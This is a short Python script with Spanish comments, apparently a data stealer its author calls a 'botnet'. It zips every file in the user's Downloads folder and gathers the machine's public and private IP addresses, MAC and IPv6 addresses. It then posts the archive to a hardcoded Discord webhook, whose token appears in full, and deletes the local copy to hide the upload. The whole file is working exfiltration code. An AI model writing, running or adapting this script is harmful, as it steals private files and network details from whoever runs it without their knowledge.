import zipfile
import os
import requests
import socket
import uuid
import platform
from pathlib import Path

# Función para obtener la IP pública
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json().get('ip', 'No disponible')
    except requests.RequestException:
        return 'No disponible'

# XXX NO SE XD
def get_network_info():
    ip_info = {}
    # IP Pública
    ip_info['public_ipv4'] = get_public_ip()
    
    # IP Privada (IPv4)
    ip_info['private_ipv4'] = socket.gethostbyname(socket.gethostname())
    
    # Dirección MAC
    if platform.system() == "Windows":
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
    else:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)])
    ip_info['mac'] = mac
    
    # IPv6 (si está disponible)
    try:
        ipv6 = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
        ip_info['ipv6'] = ipv6
    except IndexError:
        ip_info['ipv6'] = 'No disponible'
    
    return ip_info

# XXX.COM
def zip_downloads(downloads_folder, zip_path):
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for root, dirs, files in os.walk(downloads_folder):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, downloads_folder))

# funcion que ejecuta la botnet
def send_file_to_webhook(file_path, webhook_url):
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(webhook_url, files=files)
    return response.status_code, response.text

def main():
    # Ruta de la carpeta de botnet y archivo ZIP
    downloads_folder = str(Path.home() / 'Downloads')
    zip_path = 'downloads.zip'
    
    # Crear archivo ZIP de botnet 
    zip_downloads(downloads_folder, zip_path)
    print(f'Archivo zip de la botnet creacda creado en {zip_path}')
    
    # Obtener de la botnet
    network_info = get_network_info()
    print('Información de red:', network_info)
    
    # botnet easy (xd esta es la creacion)
    webhook_url = 'https://discord.com/api/webhooks/1276685758438051871/8pt4y0QSm1L_EbEx0wo5A3vjLS2QPJDoMKnR5HKNSVL3id8EJJ8oG1_q9W0VuMVc9aVa'
    
    # Enviar archivo botnet
    status_code, response_text = send_file_to_webhook(zip_path, webhook_url)
    print(f'Respuesta del webhook: {status_code}, {response_text}')
    
    #botnet create
    os.remove(zip_path)
    print(f'botnet list')

if __name__ == '__main__':
    main()
